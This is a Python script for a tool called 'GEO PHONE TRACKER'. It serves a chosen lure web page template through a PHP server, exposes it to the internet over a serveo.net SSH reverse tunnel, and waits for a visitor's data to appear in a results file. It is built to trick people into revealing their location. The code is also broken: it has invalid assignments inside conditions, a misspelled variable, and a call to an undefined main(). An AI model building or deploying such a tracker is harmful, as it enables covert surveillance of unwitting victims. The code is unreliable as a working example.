#!/usr/bin/env/python

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m' # white

from shutil import which

print(G + '[+]' + C + ' Checking Dependencies...' + W)
pkgs = ['python3', 'pip3', 'php', 'ssh']
inst = True
for pkg in pkgs:
    present = which(pkg)
    if present == None:
        print(R + '[-] ' + W + pkg + C + ' is not Installed!')
        inst = False
    else:
        pass

if inst = False:
    exit()
else:
    pass

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [ Available : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [ Default : 8080 ]')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''
version = '1.2.5'

def banner():
	print (G +
	r''' GEO PHONE TRACKER''' + W)
	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'krishpranav')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')


def ver_check():
    print(G + '[+]' + C + ' Checking for Updates.....', end='')
    ver_url = 'https://raw.githubusercontent.com/krishpranav/geo-phonetracer/master/version.txt'
    try:
        ver_rqst = requests.get(ver_url)
        ver_sc = ver_rqst.status_code
        if ver_sec == 200:
            github_ver = ver_rqst.text
            github_ver = github_ver.strip()

            if version == github_ver:
                print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
            else:
                print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
        else:
            print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
    except Exception as e:
        print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))


def tunnel_select():
    if tunnel_mode == None:
        serveo()
    elif tunnel_mode == 'manual':
        print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
    else:
        print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
        exit()

def template_select():
	global site, info, result
	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
	
	with open('template/templates.json', 'r') as templ:
		templ_info = templ.read()
	
	templ_json = json.loads(templ_info)
	
	for item in templ_json['templates']:
		name = item['name']
		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
	
	selected = int(input(G + '[>] ' + W))
	
	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
		sys.exit()
	
	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
	
	module = templ_json['templates'][selected]['module']
	if module == True:
		imp_file = templ_json['templates'][selected]['import_file']
		import importlib
		importlib.import_module('template.{}'.format(imp_file))
	else:
		pass

	info = 'template/{}/php/info.txt'.format(site)
	result = 'template/{}/php/result.txt'.format(site)

def serveo():
	global subdom
	flag = False

	print(G + '[+]' + C + ' Checking Serveo Status...', end='')

	try:
		time.sleep(1)
		rqst = requests.get('https://serveo.net', timeout=5)
		sc = rqst.status_code
		if sc == 200:
			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
		else:
			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
			exit()
	except requests.ConnectionError:
		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
		exit()
			
	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
	if subdom is None:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	
	while True:
		with open('logs/serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print(e)
				pass
		time.sleep(2)

def server():
	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Success ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Failed ' + C + ']' + W)
		Quit()
    
def wait():
    printed = False
    while True:
        time.sleep(2)
        size = os.path.getsize(result)
        if size == 0 and printed = False:
            print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
            printed = True
        if size > 0:
            main()

